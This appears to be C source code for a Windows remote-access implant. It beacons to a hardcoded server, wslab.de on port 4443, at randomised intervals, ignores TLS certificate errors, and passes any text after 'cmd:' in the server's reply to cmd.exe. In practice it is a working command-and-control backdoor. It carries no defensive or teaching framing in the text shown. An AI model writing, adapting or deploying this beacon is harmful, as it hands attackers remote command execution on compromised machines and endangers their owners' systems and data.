#include <windows.h>
#include <winhttp.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "shell32.lib")

#define SERVER_HOST L"wslab.de"
#define SERVER_PATH L"/commands"
#define SERVER_PORT 4443
//#define BASE_DELAY 60000 // 60 seconds in milliseconds
#define BASE_DELAY 6000
#define MAX_RANDOM_OFFSET 10000 // Maximum random offset of 10 seconds

void error(const char *message) {
    fprintf(stderr, "Error: %s\n", message);
}

void execute_command(const char *command) {
    ShellExecuteA(NULL, "open", "cmd.exe", command, NULL, SW_SHOWNORMAL);
}



//int main() {
int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
    DWORD dwSize = 0;
    BOOL  bResults = FALSE;
    DWORD dwDownloaded = 0;
    LPSTR pszOutBuffer;
    DWORD dwOutBufferSize;
    WCHAR szRequest[1024];

    // Initialize random seed
    srand((unsigned int)time(NULL));

    // Initialize WinHTTP session
    hSession = WinHttpOpen(L"A WinHTTP Example Program/1.0",  
                           WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                           WINHTTP_NO_PROXY_NAME, 
                           WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession)
        error("Failed to initialize WinHTTP session");

    // Connect to server
    while (1) {
        if (!hConnect) {
            hConnect = WinHttpConnect(hSession, SERVER_HOST, SERVER_PORT, 0);
            if (!hConnect) {
                error("Failed to connect to server, retrying...");
                Sleep(BASE_DELAY + rand() % MAX_RANDOM_OFFSET);
                continue;
            }
        }

        // Build request
        swprintf_s(szRequest, L"GET %s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n", SERVER_PATH, SERVER_HOST);

        // Open request handle
        hRequest = WinHttpOpenRequest(hConnect, L"GET", SERVER_PATH,
                                      NULL, WINHTTP_NO_REFERER,
                                      WINHTTP_DEFAULT_ACCEPT_TYPES,
                                      WINHTTP_FLAG_SECURE);
        if (!hRequest) {
            error("Failed to open request");
            Sleep(BASE_DELAY + rand() % MAX_RANDOM_OFFSET);
            continue;
        }

        // Set security flags to ignore SSL certificate errors
        DWORD dwFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
        WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));

        // Send request
        bResults = WinHttpSendRequest(hRequest,
                                      WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                                      WINHTTP_NO_REQUEST_DATA, 0,
                                      0, 0);
        if (!bResults) {
            error("Failed to send request");
            WinHttpCloseHandle(hRequest);
            Sleep(BASE_DELAY + rand() % MAX_RANDOM_OFFSET);
            continue;
        }

        // Receive response
        bResults = WinHttpReceiveResponse(hRequest, NULL);
        if (!bResults) {
            error("Failed to receive response");
            WinHttpCloseHandle(hRequest);
            Sleep(BASE_DELAY + rand() % MAX_RANDOM_OFFSET);
            continue;
        }

        // Read the response
        do {
            dwSize = 0;
            if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) {
                error("Failed to query data availability");
                break;
            }

            // Allocate space for the buffer
            pszOutBuffer = (LPSTR)malloc(dwSize + 1);
            if (!pszOutBuffer) {
                error("Failed to allocate memory for response buffer");
                break;
            }

            // Read the response into the buffer
            ZeroMemory(pszOutBuffer, dwSize + 1);

            if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer,
                                 dwSize, &dwDownloaded)) {
                error("Failed to read data");
                free(pszOutBuffer);
                break;
            }

            // Print the response
            printf("%s", pszOutBuffer);

            // Check for command and execute if it contains "cmd"
            if (strstr(pszOutBuffer, "cmd") != NULL) {
                //execute_command(pszOutBuffer);
				
				char *cmd = strstr(pszOutBuffer, "cmd:");
				if (cmd != NULL) {
					cmd += 4; // Move pointer past "cmd:"
					//printf("%s", cmd);
					execute_command(cmd);
				}
            }

            // Free the memory allocated to the buffer
            free(pszOutBuffer);

        } while (dwSize > 0);

        // Clean up the request handle
        WinHttpCloseHandle(hRequest);

        // Sleep for the base delay plus a random offset
        int randomOffset = rand() % MAX_RANDOM_OFFSET;
        Sleep(BASE_DELAY + randomOffset);
    }

    // Clean up
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return 0;
}
